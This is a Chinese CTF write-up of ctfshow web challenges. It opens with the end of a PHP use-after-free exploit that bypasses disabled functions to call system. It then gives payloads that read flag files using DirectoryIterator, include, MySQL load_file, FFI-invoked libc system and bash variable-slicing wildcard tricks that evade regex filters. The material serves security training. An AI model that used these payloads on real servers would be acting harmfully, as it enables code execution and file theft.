function trigger_uaf($arg) &#123;</span><br><span class="line"></span><br><span class="line">        $arg = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;);</span><br><span class="line">        $vuln = new Vuln();</span><br><span class="line">        $vuln-&gt;a = $arg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123;</span><br><span class="line">        die(&#x27;This PoC is for *nix systems only.&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = 10; </span><br><span class="line">    $contiguous = [];</span><br><span class="line">    for($i = 0; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;);</span><br><span class="line"></span><br><span class="line">    trigger_uaf(&#x27;x&#x27;);</span><br><span class="line">    $abc = $backtrace[1][&#x27;args&#x27;][0];</span><br><span class="line"></span><br><span class="line">    $helper = new Helper;</span><br><span class="line">    $helper-&gt;b = function ($x) &#123; &#125;;</span><br><span class="line"></span><br><span class="line">    if(strlen_user($abc) == 79 || strlen_user($abc) == 0) &#123;</span><br><span class="line">        die(&quot;UAF failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $closure_handlers = str2ptr($abc, 0);</span><br><span class="line">    $php_heap = str2ptr($abc, 0x58);</span><br><span class="line">    $abc_addr = $php_heap - 0xc8;</span><br><span class="line"></span><br><span class="line">    write($abc, 0x60, 2);</span><br><span class="line">    write($abc, 0x70, 6);</span><br><span class="line"></span><br><span class="line">    write($abc, 0x10, $abc_addr + 0x60);</span><br><span class="line">    write($abc, 0x18, 0xa);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, 0x20);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, 8);</span><br><span class="line">    if(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t determine binary base address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t parse ELF header&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get basic_functions address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get zif_system address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $fake_obj_offset = 0xd0;</span><br><span class="line">    for($i = 0; $i &lt; 0x110; $i += 8) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write($abc, 0x20, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, 0xd0 + 0x38, 1, 4); </span><br><span class="line">    write($abc, 0xd0 + 0x68, $zif_system); </span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctfshow(&quot;cat /flagc.txt&quot;);ob_end_flush();</span><br></pre></td></tr></table></figure>
+
+<p>同样对以上内容进行 URL 编码发送：<br><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219100_65a3941ca16cc25b49b51.png"><img src="https://image.3001.net/images/20240114/1705219100_65a3941ca16cc25b49b51.png" alt="image-20231024165637158"></a></p>
+<p>但是这里不知道什么原因，服务器返回了 502…</p>
+<h2 id="web74-函数禁用-11"><a href="#web74-函数禁用-11" class="headerlink" title="web74 函数禁用 - 11"></a>web74 函数禁用 - 11</h2><p>源码同上：</p>
+<p>这里使用 PHP 的内置类，遍历出根目录下的内容，由于 <code>scandir</code> 函数被禁用，故而不能使用该函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125;;exit();</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219105_65a3942157d16b991b1bb.png"><img src="https://image.3001.net/images/20240114/1705219105_65a3942157d16b991b1bb.png" alt="image-20231025091344105"></a></p>
+<p>PAYLOAD：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">c=include(&#x27;/flagx.txt&#x27;);exit();</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219114_65a3942a9ba1c85a05a16.png"><img src="https://image.3001.net/images/20240114/1705219114_65a3942a9ba1c85a05a16.png" alt="image-20231025091434794"></a></p>
+<h2 id="web75-76-函数禁用-12"><a href="#web75-76-函数禁用-12" class="headerlink" title="web75-76 函数禁用 - 12"></a>web75-76 函数禁用 - 12</h2><p>这里也是函数禁用，源码都一样。</p>
+<p>首先使用 PHP 内置类，列出根目录下的文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125;;exit();</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219118_65a3942eb5e612e577cc2.png"><img src="https://image.3001.net/images/20240114/1705219118_65a3942eb5e612e577cc2.png" alt="image-20231025091920015"></a></p>
+<p>发现根目录下存在文件 <code>flag36.txt</code> ，这里使用 <code>include</code> 进行包含读取：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">c=include(&#x27;/flag36.txt&#x27;);exit();</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219122_65a394325b330464e35b5.png"><img src="https://image.3001.net/images/20240114/1705219122_65a394325b330464e35b5.png" alt="image-20231025092045581"></a></p>
+<p>发现存在 <code>open_basedir</code> 的限制，由于这里了禁用了 PHP 的内置函数 <code>strlen</code>，所以我们这里需要重写 <code>strlen</code> 函数的功能，但是发送之后，服务器报 502。</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219125_65a39435a07cd6ee87d4f.png"><img src="https://image.3001.net/images/20240114/1705219125_65a39435a07cd6ee87d4f.png" alt="image-20231025091852267"></a></p>
+<p>这里是使用服务器的 MYSQL 的 load_file 函数进行读取本地文件，PAYLOAD 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219136_65a39440908f3e850ffe8.png"><img src="https://image.3001.net/images/20240114/1705219136_65a39440908f3e850ffe8.png" alt="image-20231025092520026"></a></p>
+<h2 id="web77-函数禁用-13"><a href="#web77-函数禁用-13" class="headerlink" title="web77 函数禁用 - 13"></a>web77 函数禁用 - 13</h2><p>同样是先试用 PHP 内置类获取根目录下的内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125;;exit();</span><br></pre></td></tr></table></figure>
+
+<p>发现存在 <code>flagx.txt</code> ，同时存在 <code>readflag</code> 这里尝试使用上一题的 MYSQL 直接读取 flag 文件：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219140_65a39444bef7ab3b8aaf0.png"><img src="https://image.3001.net/images/20240114/1705219140_65a39444bef7ab3b8aaf0.png" alt="image-20231025093002925"></a></p>
+<p>发现提示 <strong>could not find driver</strong>。（找不到驱动程序），通过服务器响应的字段来看，得知服务器的 PHP 版本为 <code>PHP/7.4.9</code></p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219149_65a3944da32ec30f1b04e.png"><img src="https://image.3001.net/images/20240114/1705219149_65a3944da32ec30f1b04e.png" alt="image-20231025093217475"></a></p>
+<p>在 PHP7.4 支持一个全新的扩展 <code>FEI</code> ，该扩展提供了高级语言之间的相互调用，而对于 PHP 来说，FFI 让我们可以方便的调用 C 语言写的各种库。</p>
+<p>PAYLOAD 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">c=$ffi=FFI::cdef(&quot;int system(char *command);&quot;, &quot;libc.so.6&quot;);$a=&#x27;/readflag &gt; 1.txt&#x27;;$ffi-&gt;system($a);exit();  </span><br></pre></td></tr></table></figure>
+
+<p>解析如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">$ffi=FFI::cdef(&quot;int system(char *command);&quot;, &quot;libc.so.6&quot;);//创建一个system对象</span><br><span class="line">$a=&#x27;/readflag &gt; 1.txt&#x27;;//没有回显的</span><br><span class="line">$ffi-&gt;system($a);// 通过$ffi去调用system函数</span><br></pre></td></tr></table></figure>
+
+<p>大概意思就是通过调用 C 语言的 <code>libc.so.6</code> 库去创建 <code>system</code> 对象，接着利用该对象执行系统的命令。但是这里 <code>system</code> 对象并不回显命令的执行结果，因此需要将 <code>readflag</code> 读取的内容重定向到当前目录下的 1.txt 文件中，最后访问该文件，即可得到 FLAG。</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219158_65a39456a9d9fcc0966aa.png"><img src="https://image.3001.net/images/20240114/1705219158_65a39456a9d9fcc0966aa.png" alt="image-20231025100113807"></a></p>
+<h2 id="web118-利用-PATH-读取文件"><a href="#web118-利用-PATH-读取文件" class="headerlink" title="web118 利用 PATH 读取文件"></a>web118 利用 PATH 读取文件</h2><p>访问网站，出现如下页面：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219162_65a3945ad50a4f677c072.png"><img src="https://image.3001.net/images/20240114/1705219162_65a3945ad50a4f677c072.png" alt="image-20231025105744842"></a></p>
+<p>右键查看源代码，发现提示信息：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219169_65a394617dc5b60a3075a.png"><img src="https://image.3001.net/images/20240114/1705219169_65a394617dc5b60a3075a.png" alt="image-20231025105854123"></a></p>
+<p>尝试在输入框内输入任意命令、以及数字发现都提示 <code>evil input</code>：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219167_65a3945f1608e93339d30.png"><img src="https://image.3001.net/images/20240114/1705219167_65a3945f1608e93339d30.png" alt="image-20231025105929277"></a></p>
+<p>这里尝试输入 Linux 中的变量 <code>$&#123;IFS&#125;</code> 发现并没有任何回显，也就是说，可以使用 <code>$&#123;&#125;</code> 以及<strong>大写字母</strong>也是可以用的。</p>
+<p>经过 Fuzz 之后发现可以使用 <code>大写字母-AZ </code>以及 <code>$&#123;&#125;~.?:</code></p>
+<p>在 Linux 中存在一个内置变量 <code>PWD</code>，该变量的值为当前路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line"># echo $&#123;PWD&#125;</span><br><span class="line">/var/www/html</span><br></pre></td></tr></table></figure>
+
+<p>Linux 中的 <code>PATH</code> 变量为环境变量的路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line"># echo $&#123;PATH&#125;</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br></pre></td></tr></table></figure>
+
+<p>同时在 Linux 中也可以对变量的值进行截取：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line"># echo $&#123;PWD:0:1&#125;       # 表示从0开始截取一位</span><br><span class="line">/ </span><br><span class="line"># echo $&#123;PWD:~0:1&#125;      # 表示从右边开始截取，截取一位</span><br><span class="line">l </span><br><span class="line"># echo $&#123;PWD:~0&#125;  # 表示从右边开始就去，截取1位</span><br><span class="line">l</span><br><span class="line"># echo $&#123;PWD:~A&#125;  # 这里字母A和0具有同样作用(可以是任意字母)</span><br><span class="line">l</span><br></pre></td></tr></table></figure>
+
+<p>这里我们可以通过 <code>PATH</code> 变量的值，进行截取，构造出字符串 <code>nl</code>，首先看 Linux 变量 PATH 默认的值，发现最后一个值是 <code>n</code>，如果我们想要构造出 nl 命令，需要获取该值。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line"> # echo $&#123;PATH&#125;</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line"># 构造 $&#123;PATH:~0&#125; 得到 n</span><br></pre></td></tr></table></figure>
+
+<p>但是由于这里过滤了数字，因此不能使用 数字 <code>0</code>，因此可以使用 大写的字母代替：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">$&#123;PATH~A&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此时 <code>n</code> 就得到了，但是 <code>l</code> 该怎么获取呢，我们使用 <code>PWD</code> 变量即可获取，一般情况下，网站根目录为 <code>/var/www/html</code>，我们使用 <code>PWD</code> 获取最后一个值，即可得到 <code>l</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line"># echo $&#123;PWD&#125;</span><br><span class="line">/var/www/html</span><br><span class="line"># 构造 $&#123;PWD:~A&#125; 得到 l </span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219177_65a3946962f0283b8bf80.png"><img src="https://image.3001.net/images/20240114/1705219177_65a3946962f0283b8bf80.png" alt="image-20231025141422945"></a></p>
+<p>页面提示 <code>flag in flag.php</code> 最后构造：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~B&#125;$IFS????.???</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219180_65a3946c23b6ac3a15bc7.png"><img src="https://image.3001.net/images/20240114/1705219180_65a3946c23b6ac3a15bc7.png" alt="image-20231025141628758"></a></p>
+<p><strong>其他方法：</strong></p>
+<p><code>SHLVL</code> 是记录多个 <code>Bash</code> 进程实例嵌套深度的累加器，进程第一次打开 SHELL 时 <code>$&#123;SHLVL&#125;=1</code> ，然后在此 shell 中再打开一个 SHELL 时 <code>$&#123;SHLVL&#125;=2</code>。</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219183_65a3946fc0c9cfde1cf61.png"><img src="https://image.3001.net/images/20240114/1705219183_65a3946fc0c9cfde1cf61.png" alt="image-20231025142353903"></a></p>
+<p><code>$&#123;PWD:$</code> 来替代数字，截取想要的字符串：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line"># $&#123;RANDOM&#125;是随机数，$&#123;#RANDOM&#125;一般是5，也可能是4，3等</span><br><span class="line"># 由于是随机数，这里需要多试几次</span><br><span class="line">$&#123;PATH:$&#123;#HOME&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125; ?$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125;??.???</span><br></pre></td></tr></table></figure>
+
+<h2 id="web119-利用内置变量-通配符的文件读取-1"><a href="#web119-利用内置变量-通配符的文件读取-1" class="headerlink" title="web119 利用内置变量 + 通配符的文件读取 - 1"></a>web119 利用内置变量 + 通配符的文件读取 - 1</h2><p>本道题基本同上，但是禁用了 <code>$&#123;PATH&#125;</code>。</p>
+<p>PAYLOAD：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.???</span><br></pre></td></tr></table></figure>
+
+<p>释义：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125;     ====&gt;   t</span><br><span class="line">$&#123;PWD:$&#123;Z&#125;:$&#123;#SHLVL&#125;&#125;    ====&gt;   /</span><br><span class="line">/bin/cat flag.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="web120-利用内置变量-通配符的文件读取-2"><a href="#web120-利用内置变量-通配符的文件读取-2" class="headerlink" title="web120 利用内置变量 + 通配符的文件读取 - 2"></a>web120 利用内置变量 + 通配符的文件读取 - 2</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_POST[&#x27;code&#x27;]))&#123;</span><br><span class="line">    $code=$_POST[&#x27;code&#x27;];</span><br><span class="line">    if(!preg_match(&#x27;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;, $code))&#123;    </span><br><span class="line">        if(strlen($code)&gt;65)&#123;</span><br><span class="line">            echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">        echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">     echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过代码审计发现这里过滤了 <code>\x09</code>、<code>\x0a</code>、<code>字母 a-z</code>、<code>数字 0-9</code>、<code>PATH</code>、<code>BASH</code>、<code>HOME</code>、<code>/</code>、<code>(</code>、<code>)</code>、<code>[</code>、<code>]</code>、<code>\\</code>、<code>+</code>、<code>-</code>、<code>!</code>、<code>=</code>、<code>^</code>、<code>*</code>、<code>\x26</code>、<code>%</code>、<code>&lt;</code>、<code>&gt;</code>、<code>单引号</code>、<code>双引号</code>、<code>反引号</code>、<code>|</code>、<code>逗号</code>。</p>
+<p>但是这里并没有过滤 <code>大写字母A-Z</code>、<code>$</code>、<code>?</code>、<code>*</code>、<code>空格</code>。</p>
+<p>PAYLOAD：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">code=$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br></pre></td></tr></table></figure>
+
+<p>释义：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">#       $&#123;PWD::$&#123;#SHLVL&#125;&#125; ===&gt; /</span><br><span class="line">#     ???   ==&gt;    通配符 希望是 bin</span><br><span class="line">#     &#123;PWD::$&#123;#SHLVL&#125;&#125;   ===&gt; /</span><br><span class="line">#     ?     ==&gt;    通配符 希望是c</span><br><span class="line">#         $&#123;USER:~A&#125;  ===&gt; 获取当前用户名最后一位，据说用户名最后一位是a</span><br><span class="line">#     ?     ===&gt;   通配符 希望是t</span><br><span class="line">#     ????.???    ===&gt; 通配符 希望是 flag.php</span><br><span class="line"></span><br><span class="line"># 最终组成命令 /bin/cat flag.php</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219201_65a394810c827b9712f19.png"><img src="https://image.3001.net/images/20240114/1705219201_65a394810c827b9712f19.png" alt="image-20231025184950763"></a></p>
+<h2 id="web121-利用内置变量-通配符的文件读取-3"><a href="#web121-利用内置变量-通配符的文件读取-3" class="headerlink" title="web121 利用内置变量 + 通配符的文件读取 - 3"></a>web121 利用内置变量 + 通配符的文件读取 - 3</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_POST[&#x27;code&#x27;]))&#123;</span><br><span class="line">    $code=$_POST[&#x27;code&#x27;];</span><br><span class="line">    if(!preg_match(&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;, $code))&#123;    </span><br><span class="line">        if(strlen($code)&gt;65)&#123;</span><br><span class="line">            echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">        echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">     echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里过滤了大量字符，并且 PAYLOAD 的长度不能大于 65 个字符。</p>
+<p>PAYLOAD1：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">code=$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;?? ????.???</span><br><span class="line"># 拼接 /bin/rev 读取flag.php的内容</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219207_65a394877b83f37b0e0a0.png"><img src="https://image.3001.net/images/20240114/1705219207_65a394877b83f37b0e0a0.png" alt="image-20231025190212123"></a></p>
+<p>rev 命令<strong>将文件中的每行内容以字符为单位反序输出</strong>，因此得到的 FLAG 是反序的。</p>
+<p>这里在本地 Linux 环境使用 rev 命令反过来即可：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219215_65a3948fd16425061f273.png"><img src="https://image.3001.net/images/20240114/1705219215_65a3948fd16425061f273.png" alt="image-20231025190315155"></a></p>
+<p>PAYLOAD2：由于有随机数，需要多试几次</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line">code=$&#123;PWD:$&#123;#&#125;:$&#123;##&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;##&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span><br><span class="line"># 拼接 /bin/base64 读取 flag.php 的内容编码并输出</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219219_65a39493cc875664e0d71.png"><img src="https://image.3001.net/images/20240114/1705219219_65a39493cc875664e0d71.png" alt="image-20231025190022510"></a></p>
+<h2 id="web122-web121-利用内置变量-通配符的文件读取-4"><a href="#web122-web121-利用内置变量-通配符的文件读取-4" class="headerlink" title="web122 web121 利用内置变量 + 通配符的文件读取 - 4"></a>web122 web121 利用内置变量 + 通配符的文件读取 - 4</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_POST[&#x27;code&#x27;]))&#123;</span><br><span class="line">    $code=$_POST[&#x27;code&#x27;];</span><br><span class="line">    if(!preg_match(&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;, $code))&#123;    </span><br><span class="line">        if(strlen($code)&gt;65)&#123;</span><br><span class="line">            echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">        echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">     echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>本道题比上一题多过滤了一些字符，由于过滤了 <code>#</code> 无法使用上一题的 PAYLOAD。</p>
+<p>PAYLOAD：</p>
+<p>通过 <code>$?</code> 来实现的，<code>$?</code> 是表示上一条命令执行结束后的传回值。通常 0 代表执行成功，非 0 代表执行有误</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">code=&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???</span><br></pre></td></tr></table></figure>
+
+<p>这里由于使用了 <code>RANDOM</code> 随机数变量，因此需要多刷新几次，我这里直接使用了 BP 的 Intrude 模块：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219226_65a3949addb21e224cdb5.png"><img src="https://image.3001.net/images/20240114/1705219226_65a3949addb21e224cdb5.png" alt="image-20231025191148988"></a></p>
+<h2 id="web124-代码审计"><a href="#web124-代码审计" class="headerlink" title="web124 代码审计"></a>web124 代码审计</h2><p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="line">if(!isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    //例子 c=20-1</span><br><span class="line">    $content = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if (strlen($content) &gt;= 80) &#123;</span><br><span class="line">        die(&quot;太长了不会算&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;];</span><br><span class="line">    foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">        if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br><span class="line">    $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, 